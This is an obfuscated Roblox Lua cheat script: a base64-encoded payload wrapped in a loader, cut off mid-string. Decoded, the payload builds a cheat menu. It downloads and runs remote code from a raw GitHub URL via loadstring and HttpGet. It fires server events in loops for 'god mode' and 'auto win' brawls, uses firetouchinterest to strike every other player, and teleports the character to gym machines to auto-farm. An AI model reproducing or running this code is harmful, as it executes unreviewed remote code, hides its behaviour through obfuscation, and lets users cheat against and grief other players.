--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-12-09 16:30:09]] (function() local __b = "Cgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgpsb2NhbCBkaXNwbGF5ID0gTG9jYWxQbGF5ZXIuRGlzcGxheU5hbWUgb3IgTG9jYWxQbGF5ZXIuTmFtZQoKbG9jYWwgbGlicmFyeSA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2NyaXB0LUt5bGUvU2VjcmV0L3JlZnMvaGVhZHMvbWFpbi9TTEgtQ2xhbi5sdWEiKSkoKQoKbG9jYWwgd2luZG93ID0gbGlicmFyeTpBZGRXaW5kb3coIlNMSCBQdWJsaWMgVmVyc2lvbiB8IFdlbGNvbWUgLSAiIC4uIGRpc3BsYXksIHsKICAgIG1haW5fY29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgIG1pbl9zaXplID0gVmVjdG9yMi5uZXcoNjM1LCA4MjApLAogICAgY2FuX3Jlc2l6ZSA9IGZhbHNlLAp9KQoKbG9jYWwgbWFpblRhYiA9IHdpbmRvdzpBZGRUYWIoIk1haW4iKQoKbG9jYWwgQnJhd2xGb2xkZXIgPSBtYWluVGFiOkFkZEZvbGRlcigiQXV0byBCcmF3bHMiKQoKbG9jYWwgZ29kTW9kZVRvZ2dsZSA9IGZhbHNlCgpCcmF3bEZvbGRlcjpBZGRTd2l0Y2goIkdvZCBNb2RlIEJyYXdsIiwgZnVuY3Rpb24oU3RhdGUpCiAgICBnb2RNb2RlVG9nZ2xlID0gU3RhdGUKCiAgICBpZiBTdGF0ZSB0aGVuCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdvZE1vZGVUb2dnbGUgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKLS0gQXV0byBXaW4gQnJhd2wgVG9nZ2xlCmxvY2FsIGF1dG9XaW5CcmF3bFN3aXRjaCA9IEJyYXdsRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBXaW4gQnJhd2xzIiwgZnVuY3Rpb24oYm9vbCkKICAgIGdldGdlbnYoKS5hdXRvV2luQnJhd2wgPSBib29sCiAgICAKICAgIC0tIEVxdWlwIFB1bmNoIFRvb2wgZnVuY3Rpb24gLSB3aWxsIGJlIGNhbGxlZCByZXBlYXRlZGx5CiAgICBsb2NhbCBmdW5jdGlvbiBlcXVpcFB1bmNoKCkKICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICAKICAgICAgICAtLSBDaGVjayBpZiBhbHJlYWR5IGVxdWlwcGVkCiAgICAgICAgaWYgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICAgICAgCiAgICAgICAgLS0gVHJ5IHRvIGVxdWlwIGZyb20gYmFja3BhY2sKICAgICAgICBsb2NhbCBiYWNrcGFjayA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGlmIG5vdCBiYWNrcGFjayB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sLkNsYXNzTmFtZSA9PSAiVG9vbCIgYW5kIHRvb2wuTmFtZSA9PSAiUHVuY2giIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAogICAgCiAgICAtLSBTYWZlIHBsYXllciBjaGVjayBmdW5jdGlvbgogICAgbG9jYWwgZnVuY3Rpb24gaXNWYWxpZFRhcmdldChwbGF5ZXIpCiAgICAgICAgaWYgbm90IHBsYXllciBvciBub3QgcGxheWVyLlBhcmVudCB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICBpZiBwbGF5ZXIgPT0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICBpZiB3aGl0ZWxpc3RbcGxheWVyLlVzZXJJZF0gdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgb3Igbm90IGNoYXJhY3Rlci5QYXJlbnQgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICBpZiBub3QgaHVtYW5vaWQgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgLS0gTXVsdGlwbGUgaGVhbHRoIGNoZWNrcyB0byBiZSBhYnNvbHV0ZWx5IGNlcnRhaW4KICAgICAgICBpZiBub3QgaHVtYW5vaWQuSGVhbHRoIG9yIGh1bWFub2lkLkhlYWx0aCA8PSAwIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgICAgIGlmIGh1bWFub2lkOkdldFN0YXRlKCkgPT0gRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5EZWFkIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBub3Qgcm9vdFBhcnQgb3Igbm90IHJvb3RQYXJ0LlBhcmVudCB0aGVuIHJldHVybiBmYWxzZSBlbmQKICAgICAgICAKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZW5kCiAgICAKICAgIC0tIFNhZmUgbG9jYWwgcGxheWVyIGNoZWNrIGZ1bmN0aW9uCiAgICBsb2NhbCBmdW5jdGlvbiBpc0xvY2FsUGxheWVyUmVhZHkoKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGlmIG5vdCBwbGF5ZXIgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgb3Igbm90IGNoYXJhY3Rlci5QYXJlbnQgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICBpZiBub3QgaHVtYW5vaWQgb3IgaHVtYW5vaWQuSGVhbHRoIDw9IDAgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikKICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpCiAgICAgICAgCiAgICAgICAgcmV0dXJuIChsZWZ0SGFuZCB+PSBuaWwgb3IgcmlnaHRIYW5kIH49IG5pbCkKICAgIGVuZAogICAgCiAgICAtLSBTYWZlIGZpcmV0b3VjaGludGVyZXN0IGZ1bmN0aW9uCiAgICBsb2NhbCBmdW5jdGlvbiBzYWZlVG91Y2hJbnRlcmVzdCh0YXJnZXRQYXJ0LCBsb2NhbFBhcnQpCiAgICAgICAgaWYgbm90IHRhcmdldFBhcnQgb3Igbm90IHRhcmdldFBhcnQuUGFyZW50IHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgICAgIGlmIG5vdCBsb2NhbFBhcnQgb3Igbm90IGxvY2FsUGFydC5QYXJlbnQgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgc3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh0YXJnZXRQYXJ0LCBsb2NhbFBhcnQsIDApCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh0YXJnZXRQYXJ0LCBsb2NhbFBhcnQsIDEpCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIHJldHVybiBzdWNjZXNzCiAgICBlbmQKICAgIAogICAgLS0gSm9pbiBCcmF3bCBMb29wCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b1dpbkJyYXdsIGFuZCB0YXNrLndhaXQoMC41KSBkbwogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLlBsYXllckd1aS5nYW1lR3VpLmJyYXdsSm9pbkxhYmVsLlZpc2libGUgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuZ2FtZUd1aS5icmF3bEpvaW5MYWJlbC5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIEVxdWlwbWVudCBsb29wIC0ga2VlcHMgdHJ5aW5nIHRvIGVxdWlwIHRoZSBwdW5jaAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCBhbmQgdGFzay53YWl0KDAuNSkgZG8KICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvV2luQnJhd2wgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgZXF1aXBQdW5jaCgpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIEF1dG8gUHVuY2ggTG9vcCAtIGtlZXBzIHB1bmNoaW5nCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b1dpbkJyYXdsIGFuZCB0YXNrLndhaXQoMC4xKSBkbwogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgaXNMb2NhbFBsYXllclJlYWR5KCkgYW5kIGdhbWUuUmVwbGljYXRlZFN0b3JhZ2UuYnJhd2xJblByb2dyZXNzLlZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikgZW5kKQogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKSBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBNYWluIEtpbGwgTG9vcCAtIGV4dHJlbWVseSByZXNpbGllbnQKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvV2luQnJhd2wgYW5kIHRhc2sud2FpdCgwLjA1KSBkbwogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gT25seSBwcm9jZWVkIGlmIGxvY2FsIHBsYXllciBpcyByZWFkeSBhbmQgYnJhd2wgaXMgaW4gcHJvZ3Jlc3MKICAgICAgICAgICAgaWYgaXNMb2NhbFBsYXllclJlYWR5KCkgYW5kIGdhbWUuUmVwbGljYXRlZFN0b3JhZ2UuYnJhd2xJblByb2dyZXNzLlZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIFByb2Nlc3MgZWFjaCBwbGF5ZXIgaW5kaXZpZHVhbGx5IHdpdGggZXJyb3IgaGFuZGxpbmcKICAgICAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgLS0gU2tpcCBpZiB0b2dnbGUgd2FzIHR1cm5lZCBvZmYgbWlkLWxvb3AKICAgICAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIFVzZSBwY2FsbCBmb3IgdGhlIGVudGlyZSBwbGF5ZXIgcHJvY2Vzc2luZyB0byBwcmV2ZW50IGFueSBlcnJvcnMgZnJvbSBicmVha2luZyB0aGUgbG9vcAogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNWYWxpZFRhcmdldChwbGF5ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gVHJ5IGxlZnQgaGFuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhZmVUb3VjaEludGVyZXN0KHRhcmdldFJvb3QsIGxlZnRIYW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFRyeSByaWdodCBoYW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByaWdodEhhbmQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhZmVUb3VjaEludGVyZXN0KHRhcmdldFJvb3QsIHJpZ2h0SGFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gU21hbGwgZGVsYXkgYmV0d2VlbiBwbGF5ZXJzIHRvIHByZXZlbnQgb3ZlcndoZWxtaW5nCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIFJlY292ZXJ5IHN5c3RlbSAtIGlmIHRoZSBtYWluIGxvb3Agc29tZWhvdyBicmVha3MsIHRoaXMgd2lsbCByZXN0YXJ0IGl0CiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBsYXN0UGxheWVyQ291bnQgPSAwCiAgICAgICAgbG9jYWwgc3R1Y2tDb3VudGVyID0gMAogICAgICAgIAogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvV2luQnJhd2wgYW5kIHRhc2sud2FpdCgxKSBkbwogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9XaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0gQ2hlY2sgaWYgd2UncmUgcHJvY2Vzc2luZyBwbGF5ZXJzCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRQbGF5ZXJDb3VudCA9ICNQbGF5ZXJzOkdldFBsYXllcnMoKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gSWYgcGxheWVyIGNvdW50IGNoYW5nZWQgYnV0IHdlJ3JlIG5vdCBzZWVpbmcgYW55IGFjdGl2aXR5LCByZXN0YXJ0IHRoZSBraWxsIGxvb3AKICAgICAgICAgICAgaWYgY3VycmVudFBsYXllckNvdW50IH49IGxhc3RQbGF5ZXJDb3VudCB0aGVuCiAgICAgICAgICAgICAgICBzdHVja0NvdW50ZXIgPSAwCiAgICAgICAgICAgICAgICBsYXN0UGxheWVyQ291bnQgPSBjdXJyZW50UGxheWVyQ291bnQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgc3R1Y2tDb3VudGVyID0gc3R1Y2tDb3VudGVyICsgMQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBJZiB3ZSBzZWVtIHN0dWNrIGZvciB0b28gbG9uZywgZm9yY2UgcmUtZXF1aXAgdGhlIHRvb2wKICAgICAgICAgICAgICAgIGlmIHN0dWNrQ291bnRlciA+IDUgdGhlbgogICAgICAgICAgICAgICAgICAgIHN0dWNrQ291bnRlciA9IDAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBGb3JjZSByZS1lcXVpcAogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuUHVuY2guUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXF1aXBQdW5jaCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVxdWlwUHVuY2goKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCkJyYXdsRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBKb2luIEJyYXdscyIsIGZ1bmN0aW9uKGJvb2wpCiAgICBnZXRnZW52KCkuYXV0b0pvaW5CcmF3bCA9IGJvb2wKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0pvaW5CcmF3bCBhbmQgdGFzay53YWl0KDAuNSkgZG8KICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0pvaW5CcmF3bCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuZ2FtZUd1aS5icmF3bEpvaW5MYWJlbC5WaXNpYmxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLlBsYXllckd1aS5nYW1lR3VpLmJyYXdsSm9pbkxhYmVsLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKbG9jYWwganVuZ2xlR3ltRm9sZGVyID0gbWFpblRhYjpBZGRGb2xkZXIoIiAgQXV0byBKdW5nbGUgR3ltIikKCi0tIENhY2hlIHNlcnZpY2VzIGZvciBmYXN0ZXIgYWNjZXNzCmxvY2FsIFZJTSA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbElucHV0TWFuYWdlciIpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCi0tIEhlbHBlciBmdW5jdGlvbnMgZm9yIEp1bmdsZSBHeW0KbG9jYWwgZnVuY3Rpb24gcHJlc3NFKCkKICAgIFZJTTpTZW5kS2V5RXZlbnQodHJ1ZSwgIkUiLCBmYWxzZSwgZ2FtZSkKICAgIHRhc2sud2FpdCgwLjEpCiAgICBWSU06U2VuZEtleUV2ZW50KGZhbHNlLCAiRSIsIGZhbHNlLCBnYW1lKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGF1dG9MaWZ0KCkKICAgIHdoaWxlIGdldGdlbnYoKS53b3JraW5nIGRvCiAgICAgICAgTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICB0YXNrLndhaXQoKSAtLSBNb3JlIGVmZmljaWVudCB0aGFuIHRhc2sud2FpdCgwKSBvciB0YXNrLndhaXQoc21hbGwgbnVtYmVyKQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gdGVsZXBvcnRBbmRTdGFydChtYWNoaW5lTmFtZSwgcG9zaXRpb24pCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHBvc2l0aW9uCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBwcmVzc0UoKQogICAgICAgIHRhc2suc3Bhd24oYXV0b0xpZnQpIC0tIFVzZSB0YXNrLnNwYXduIHRvIHByZXZlbnQgVUkgZnJlZXppbmcKICAgIGVuZAplbmQKCi0tIEp1bmdsZSBHeW0gQmVuY2ggUHJlc3MKanVuZ2xlR3ltRm9sZGVyOkFkZFN3aXRjaCgiSnVuZ2xlIEJlbmNoIFByZXNzIiwgZnVuY3Rpb24oYm9vbCkKICAgIGlmIGdldGdlbnYoKS53b3JraW5nIGFuZCBub3QgYm9vbCB0aGVuCiAgICAgICAgZ2V0Z2VudigpLndvcmtpbmcgPSBmYWxzZQogICAgICAgIHJldHVybgogICAgZW5kCiAgICAKICAgIGdldGdlbnYoKS53b3JraW5nID0gYm9vbAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgdGVsZXBvcnRBbmRTdGFydCgiQmVuY2ggUHJlc3MiLCBDRnJhbWUubmV3KC04MTczLCA2NCwgMTg5OCkpCiAgICBlbmQKZW5kKQoKLS0gSnVuZ2xlIEd5bSBTcXVhdApqdW5nbGVHeW1Gb2xkZXI6QWRkU3dpdGNoKCJKdW5nbGUgU3F1YXQiLCBmdW5jdGlvbihib29sKQogICAgaWYgZ2V0Z2VudigpLndvcmtpbmcgYW5kIG5vdCBib29sIHRoZW4KICAgICAgICBnZXRnZW52KCkud29ya2luZyA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIAogICAgZ2V0Z2VudigpLndvcmtpbmcgPSBib29sCiAgICBpZiBib29sIHRoZW4KICAgICAgICB0ZWxlcG9ydEFuZFN0YXJ0KCJTcXVhdCIsIENGcmFtZS5uZXcoLTgzNTIsIDM0LCAyODc4KSkKICAgIGVuZAplbmQpCgotLSBKdW5nbGUgR3ltIFB1bGwgVXAKanVuZ2xlR3ltRm9sZGVyOkFkZFN3aXRjaCgiSnVuZ2xlIFB1bGwgVXBzIiwgZnVuY3Rpb24oYm9vbCkKICAgIGlmIGdldGdlbnYoKS53b3JraW5nIGFuZCBub3QgYm9vbCB0aGVuCiAgICAgICAgZ2V0Z2VudigpLndvcmtpbmcgPSBmYWxzZQogICAgICAgIHJldHVybgogICAgZW5kCiAgICAKICAgIGdldGdlbnYoKS53b3JraW5nID0gYm9vbAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgdGVsZXBvcnRBbmRTdGFydCgiUHVsbCBVcCIsIENGcmFtZS5uZXcoLTg2NjYsIDM0LCAyMDcwKSkKICAgIGVuZAplbmQpCgotLSBKdW5nbGUgR3ltIEJvdWxkZXIKanVuZ2xlR3ltRm9sZGVyOkFkZFN3aXRjaCgiSnVuZ2xlIEJvdWxkZXIiLCBmdW5jdGlvbihib29sKQogICAgaWYgZ2V0Z2VudigpLndvcmtpbmcgYW5kIG5vdCBib29sIHRoZW4KICAgICAgICBnZXRnZW52KCkud29ya2luZyA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIAogICAgZ2V0Z2VudigpLndvcmtpbmcgPSBib29sCiAgICBpZiBib29sIHRoZW4KICAgICAgICB0ZWxlcG9ydEFuZFN0YXJ0KCJCb3VsZGVyIiwgQ0ZyYW1lLm5ldygtODYyMSwgMzQsIDI2ODQpKQogICAgZW5kCmVuZCkKCi0tIE5FVzogRmFybSBHeW1zIEZvbGRlcgpsb2NhbCBmYXJtR3ltc0ZvbGRlciA9IG1haW5UYWI6QWRkRm9sZGVyKCIgIEF1dG8gR3ltcyIpCgotLSBXb3Jrb3V0IHBvc2l0aW9ucyBkYXRhCmxvY2FsIHdvcmtvdXRQb3NpdGlvbnMgPSB7CiAgICBbIkJlbmNoIFByZXNzIl0gPSB7CiAgICAgICAgWyJFdGVybmFsIEd5bSJdID0gQ0ZyYW1lLm5ldygtNzE3Ni4xOTE0MSwgNDUuMzk0MTA0LCAtMTEwNi4zMTQyMSksCiAgICAgICAgWyJMZWdlbmQgR3ltIl0gPSBDRnJhbWUubmV3KDQxMTEuOTE3NDgsIDEwMjAuNDY2NzQsIC0zNzk5Ljk3MjE3KSwKICAgICAgICBbIk11c2NsZSBLaW5nIEd5bSJdID0gQ0ZyYW1lLm5ldygtODU5MC4wNjE1MiwgNDYuMDE2NzQyNywgLTYwNDMuMzQ3MTcpCiAgICB9LAogICAgWyJTcXVhdCJdID0gewogICAgICAgIFsiRXRlcm5hbCBHeW0iXSA9IENGcmFtZS5uZXcoLTcxNzYuMTkxNDEsIDQ1LjM5NDEwNCwgLTExMDYuMzE0MjEpLAogICAgICAgIFsiTGVnZW5kIEd5bSJdID0gQ0ZyYW1lLm5ldyg0MzA0Ljk5MDIzLCA5ODcuODI5OTU2LCAtNDEyNC4yMzM0KSwKICAgICAgICBbIk11c2NsZSBLaW5nIEd5bSJdID0gQ0ZyYW1lLm5ldygtODk0MC4xMjQwMiwgMTMuMTY0MjA4NCwgLTU2OTkuMTM0NzcpCiAgICB9LAogICAgWyJEZWFkbGlmdCJdID0gewogICAgICAgIFsiRXRlcm5hbCBHeW0iXSA9IENGcmFtZS5uZXcoLTcxNzYuMTkxNDEsIDQ1